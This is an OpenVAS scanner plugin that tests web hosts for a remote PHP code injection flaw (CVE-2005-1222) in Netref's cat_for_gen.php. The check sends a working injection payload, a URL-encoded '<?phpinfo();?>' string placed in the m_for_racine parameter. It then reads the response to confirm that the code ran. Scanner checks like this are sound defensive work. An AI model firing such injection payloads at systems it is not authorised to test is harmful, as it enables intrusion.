# OpenVAS Vulnerability Test
# $Id: netref_cat_for_gen.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Netref Cat_for_gen.PHP Remote PHP Script Injection Vulnerability
#
# Authors:
# Josh Zlatin-Amishav <josh at tkos dot co dot il>
# Fixed by Tenable:
#  - Improved description
#  - Streamlined code.
#  - Improved exploit.
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host is running the Netref directory script, written in
PHP. 

There is a vulnerability in the installed version of Netref that
enables a remote attacker to pass arbitrary PHP script code through
the 'ad', 'ad_direct', and 'm_for_racine' parameters of the
'cat_for_gen.php' script.  This code will be executed on the remote
host under the privileges of the web server userid.";

tag_solution = "Upgrade to Netref 4.3 or later.";

if(description)
{
 script_id(18358);
 script_version("$Revision: 17 $");
 script_cve_id("CVE-2005-1222");
 script_bugtraq_id(13275);
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 name = "Netref Cat_for_gen.PHP Remote PHP Script Injection Vulnerability";
 script_name(name);

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);

 summary = "Netref Cat_for_gen.PHP Remote PHP Script Injection Vulnerability";
 script_summary(summary);
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if (!can_host_php(port:port)) exit(0);

function check(url)
{
 # Try to call PHP's phpinfo() function.
 req = http_get(item:url +"/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=%3C/option%3E%3C/SELECT%3E%3C?phpinfo();?%3E", port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if ( res == NULL ) exit(0);
 if ( "PHP Version" >< res )
 {
        security_hole(port);
        exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
  check(url:dir);
}
